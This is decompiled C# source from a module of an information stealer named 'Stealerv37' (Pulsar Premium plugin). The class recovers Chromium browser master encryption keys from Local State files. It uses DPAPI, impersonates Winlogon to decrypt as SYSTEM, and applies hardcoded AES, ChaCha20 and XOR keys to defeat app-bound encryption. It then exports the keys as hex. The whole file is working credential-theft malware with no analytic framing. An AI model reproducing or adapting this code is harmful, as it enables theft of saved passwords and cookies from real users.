// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.Encrypted.LocalState
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

#nullable disable
namespace Intelix.Helper.Encrypted;

public static class LocalState
{
  private static readonly ConcurrentDictionary<string, Lazy<byte[]>> _masterKeyCacheV10 = new ConcurrentDictionary<string, Lazy<byte[]>>();
  private static readonly ConcurrentDictionary<string, Lazy<byte[]>> _masterKeyCacheV20 = new ConcurrentDictionary<string, Lazy<byte[]>>();
  private static readonly ConcurrentDictionary<string, SemaphoreSlim> _locks = new ConcurrentDictionary<string, SemaphoreSlim>();

  public static List<string[]> GetMasterKeys()
  {
    List<string[]> masterKeys = new List<string[]>();
    foreach (KeyValuePair<string, Lazy<byte[]>> keyValuePair in LocalState._masterKeyCacheV10)
    {
      try
      {
        string str = keyValuePair.Key ?? "";
        Lazy<byte[]> lazy = keyValuePair.Value;
        if (lazy != null)
        {
          byte[] numArray = lazy.Value;
          if (numArray != null)
          {
            StringBuilder stringBuilder = new StringBuilder(numArray.Length * 2);
            foreach (byte num in numArray)
              stringBuilder.Append(num.ToString("X2"));
            masterKeys.Add(new string[3]
            {
              str,
              "v10",
              stringBuilder.ToString()
            });
          }
        }
      }
      catch
      {
      }
    }
    foreach (KeyValuePair<string, Lazy<byte[]>> keyValuePair in LocalState._masterKeyCacheV20)
    {
      try
      {
        string str = keyValuePair.Key ?? "";
        Lazy<byte[]> lazy = keyValuePair.Value;
        if (lazy != null)
        {
          byte[] numArray = lazy.Value;
          if (numArray != null)
          {
            StringBuilder stringBuilder = new StringBuilder(numArray.Length * 2);
            foreach (byte num in numArray)
              stringBuilder.Append(num.ToString("X2"));
            masterKeys.Add(new string[3]
            {
              str,
              "v20",
              stringBuilder.ToString()
            });
          }
        }
      }
      catch
      {
      }
    }
    return masterKeys;
  }

  public static byte[] MasterKeyV20(string localstate)
  {
    SemaphoreSlim orAdd = LocalState._locks.GetOrAdd(localstate, (Func<string, SemaphoreSlim>) (_ => new SemaphoreSlim(1, 1)));
    orAdd.Wait();
    try
    {
      Lazy<byte[]> lazy1;
      if (LocalState._masterKeyCacheV20.TryGetValue(localstate, out lazy1))
        return lazy1.Value;
      Lazy<byte[]> lazy2 = new Lazy<byte[]>((Func<byte[]>) (() => LocalState.ComputeMasterKeyV20(localstate)));
      LocalState._masterKeyCacheV20[localstate] = lazy2;
      return lazy2.Value;
    }
    finally
    {
      orAdd.Release();
    }
  }

  private static byte[] ComputeMasterKeyV20(string localstate)
  {
    try
    {
      Match match = Regex.Match(LocalState.LocalStateContent(localstate), "\"app_bound_encrypted_key\"\\s*:\\s*\"([^\"]+)\"");
      if (!match.Success)
        return (byte[]) null;
      BlobParsedData blobParsedData = ParseKeyBlob.Parse(LocalState.DecryptAsSystemUser(((IEnumerable<byte>) Convert.FromBase64String(match.Groups[1].Value)).Skip<byte>(4).ToArray<byte>()));
      switch (blobParsedData.Flag)
      {
        case 1:
          return AesGcm256.Decrypt(new byte[32 /*0x20*/]
          {
            (byte) 179,
            (byte) 28,
            (byte) 110,
            (byte) 36,
            (byte) 26,
            (byte) 200,
            (byte) 70,
            (byte) 114,
            (byte) 141,
            (byte) 169,
            (byte) 193,
            (byte) 250,
            (byte) 196,
            (byte) 147,
            (byte) 102,
            (byte) 81,
            (byte) 207,
            (byte) 251,
            (byte) 148,
            (byte) 77,
            (byte) 20,
            (byte) 58,
            (byte) 184,
            (byte) 22,
            (byte) 39,
            (byte) 107,
            (byte) 204,
            (byte) 109,
            (byte) 160 /*0xA0*/,
            (byte) 40,
            (byte) 71,
            (byte) 135
          }, blobParsedData.Iv, (byte[]) null, blobParsedData.Ciphertext, blobParsedData.Tag);
        case 2:
          return ChaCha20Poly1305.Decrypt(new byte[32 /*0x20*/]
          {
            (byte) 233,
            (byte) 143,
            (byte) 55,
            (byte) 215,
            (byte) 244,
            (byte) 225,
            (byte) 250,
            (byte) 67,
            (byte) 61,
            (byte) 25,
            (byte) 48 /*0x30*/,
            (byte) 77,
            (byte) 194,
            (byte) 37,
            (byte) 128 /*0x80*/,
            (byte) 66,
            (byte) 9,
            (byte) 14,
            (byte) 45,
            (byte) 29,
            (byte) 126,
            (byte) 234,
            (byte) 118,
            (byte) 112 /*0x70*/,
            (byte) 212,
            (byte) 31 /*0x1F*/,
            (byte) 115,
            (byte) 141,
            (byte) 8,
            (byte) 114,
            (byte) 150,
            (byte) 96 /*0x60*/
          }, blobParsedData.Iv, blobParsedData.Ciphertext, blobParsedData.Tag);
        case 3:
          byte[] numArray = new byte[32 /*0x20*/]
          {
            (byte) 204,
            (byte) 248,
            (byte) 161,
            (byte) 206,
            (byte) 197,
            (byte) 102,
            (byte) 5,
            (byte) 184,
            (byte) 81,
            (byte) 117,
            (byte) 82,
            (byte) 186,
            (byte) 26,
            (byte) 45,
            (byte) 6,
            (byte) 28,
            (byte) 3,
            (byte) 162,
            (byte) 158,
            (byte) 144 /*0x90*/,
            (byte) 39,
            (byte) 79,
            (byte) 178,
            (byte) 252,
            (byte) 245,
            (byte) 155,
            (byte) 164,
            (byte) 183,
            (byte) 92,
            (byte) 57,
            (byte) 35,
            (byte) 144 /*0x90*/
          };
          byte[] key = LocalState.CDecryptor(blobParsedData.EncryptedAesKey);
          for (int index = 0; index < key.Length; ++index)
            key[index] ^= numArray[index];
          return AesGcm256.Decrypt(key, blobParsedData.Iv, (byte[]) null, blobParsedData.Ciphertext, blobParsedData.Tag);
        case 32 /*0x20*/:
          return blobParsedData.EncryptedAesKey;
        default:
          return (byte[]) null;
      }
    }
    catch
    {
      return (byte[]) null;
    }
  }

  public static byte[] MasterKeyV10(string localstate)
  {
    SemaphoreSlim orAdd = LocalState._locks.GetOrAdd(localstate, (Func<string, SemaphoreSlim>) (_ => new SemaphoreSlim(1, 1)));
    orAdd.Wait();
    try
    {
      Lazy<byte[]> lazy1;
      if (LocalState._masterKeyCacheV10.TryGetValue(localstate, out lazy1))
        return lazy1.Value;
      Lazy<byte[]> lazy2 = new Lazy<byte[]>((Func<byte[]>) (() => LocalState.ComputeMasterKeyV10(localstate)));
      LocalState._masterKeyCacheV10[localstate] = lazy2;
      return lazy2.Value;
    }
    finally
    {
      orAdd.Release();
    }
  }

  private static byte[] ComputeMasterKeyV10(string localstate)
  {
    try
    {
      Match match = Regex.Match(LocalState.LocalStateContent(localstate), "\"encrypted_key\":\"(.*?)\"");
      return !match.Success ? (byte[]) null : DpApi.Decrypt(((IEnumerable<byte>) Convert.FromBase64String(match.Groups[1].Value)).Skip<byte>(5).ToArray<byte>());
    }
    catch
    {
      return (byte[]) null;
    }
  }

  private static byte[] CDecryptor(byte[] encryptedData)
  {
    using (ImpersonationHelper.ImpersonateWinlogon())
      return CngDecryptor.Decrypt(encryptedData);
  }

  private static byte[] DecryptAsSystemUser(byte[] encryptedData)
  {
    using (ImpersonationHelper.ImpersonateWinlogon())
      encryptedData = DpApi.Decrypt(encryptedData);
    return DpApi.Decrypt(encryptedData);
  }

  private static string LocalStateContent(string localstate)
  {
    string str1 = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
    File.Copy(localstate, str1, true);
    string str2 = File.ReadAllText(str1);
    File.Delete(str1);
    return str2;
  }
}
